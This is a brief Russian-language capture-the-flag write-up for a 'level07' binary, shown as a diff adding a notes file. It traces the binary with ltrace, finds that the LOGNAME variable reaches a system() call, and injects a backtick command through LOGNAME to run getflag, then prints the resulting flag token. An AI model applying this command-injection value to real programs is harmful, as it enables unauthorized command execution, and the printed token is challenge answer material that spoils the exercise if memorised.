@@ -1,0 +1,14 @@
+Запускаем бинарник level07 c ltrace
+
+ ltrace ./level07 , видим следующее:
+
+getenv("LOGNAME")                                                     = "level07"
+asprintf(0xbffff744, 0x8048688, 0xbfffff47, 0xb7e5ee55, 0xb7fed280)   = 18
+system("/bin/echo level07 "level07
+
+Вероятно LOGNAME это имя текущего пользователя которое программа и выводит, проверим
+export LOGNAME=kek; ./level07
+
+Ну и теперь возможность заабузить очевидна
+export LOGNAME=\`getflag\`; ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
